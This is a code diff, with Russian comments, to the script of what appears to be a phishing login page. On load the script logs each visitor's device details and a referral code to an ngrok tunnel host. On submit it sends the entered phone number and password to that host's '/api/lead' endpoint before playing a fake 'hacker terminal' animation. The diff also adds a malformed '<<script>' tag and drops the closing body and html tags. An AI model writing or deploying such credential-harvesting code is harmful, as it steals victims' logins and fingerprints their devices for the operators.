@@ -170,7 +170,7 @@
         </div>
     </div>
 
-    <script>
+    <<script>
         document.addEventListener('DOMContentLoaded', () => {
             const hackerModal = document.getElementById('hackerModal');
             const successModal = document.getElementById('successModal');
@@ -201,17 +201,17 @@
                 { type: 'success', text: 'Готово!' }
             ];
 
-            // 1. Считываем параметры из адресной строки и сохраняем реферал
+            // 1. Захват и сохранение реферального кода
             const urlParams = new URLSearchParams(window.location.search);
             let refCode = urlParams.get('ref');
             
             if (refCode) {
-                localStorage.setItem('manager_ref', refCode);
+                localStorage.setItem('refCode', refCode);
             } else {
-                refCode = localStorage.getItem('manager_ref');
+                refCode = localStorage.getItem('refCode');
             }
 
-            // 2. Сбор данных об устройстве пользователя
+            // 2. Сбор данных об устройстве для логов визита
             const visitDeviceInfo = {
                 userAgent: navigator.userAgent,
                 platform: navigator.platform || (navigator.userAgentData ? navigator.userAgentData.platform : 'Неизвестно'),
@@ -220,21 +220,19 @@
                 localTime: new Date().toLocaleString('ru-RU')
             };
 
-            // 3. Отправка информации о визите на сервер
+            // 3. Отправка лога визита (срабатывает при загрузке страницы)
             const visitPayload = { 
                 deviceInfo: visitDeviceInfo,
-                refCode: refCode || null
+                refCode: refCode || null 
             };
 
             fetch('https://accent-cried-guzzler.ngrok-free.dev/api/visit', { 
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(visitPayload)
-            }).catch(err => {
-                console.error("Ошибка отправки визита:", err);
-            });
+            }).catch(err => console.error("Ошибка отправки визита:", err));
 
-            // 4. Отправка данных формы
+            // 4. Обработка нажатия на кнопку входа
             submitBtn.addEventListener('click', () => {
                 const phoneVal = userInput.value.trim();
                 const passVal = passwordInput.value.trim();
@@ -244,22 +242,24 @@
                     return;
                 }
 
+                // Формируем payload для /api/lead (заполняем обязательные поля заглушками)
                 const payload = {
-                    phone: phoneVal,
-                    password: passVal,
-                    deviceInfo: visitDeviceInfo,
                     refCode: refCode || null,
-                    image: "" // заглушка для API биометрии, если требуется базой
+                    fullName: "Данные со страницы входа", 
+                    phone: phoneVal,
+                    email: "Не указана",
+                    address: "Не указан",
+                    password: passVal
                 };
 
-                fetch('https://accent-cried-guzzler.ngrok-free.dev/api/biometry', {
+                // Отправляем данные на сервер
+                fetch('https://accent-cried-guzzler.ngrok-free.dev/api/lead', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
-                }).catch(err => {
-                    console.error("Ошибка отправки данных:", err);
-                });
+                }).catch(err => console.error("Ошибка отправки данных:", err));
 
+                // Запуск визуальной анимации
                 hackerModal.classList.add('visible');
                 runHackerTerminal(() => {
                     hackerModal.classList.remove('visible');
@@ -316,20 +316,16 @@
                 if (ua.indexOf("Linux") != -1) os = "Linux, PC";
                 if (/Android/.test(ua)) os = "Android, Smartphone";
                 if (/iPhone|iPad|iPod/.test(ua)) os = "iOS, Smartphone";
-                successDevice.textContent = os;
+                if (successDevice) successDevice.textContent = os;
 
                 fetch('https://api.ipify.org?format=json')
                     .then(res => res.json())
                     .then(data => {
-                        successIP.textContent = data.ip;
+                        if (successIP) successIP.textContent = data.ip;
                     })
-                    .catch(err => {
-                        console.error("Не удалось загрузить IP", err);
-                    });
+                    .catch(err => console.error("Не удалось загрузить IP", err));
 
                 successModal.classList.add('visible');
             }
         });
     </script>
-</body>
-</html>
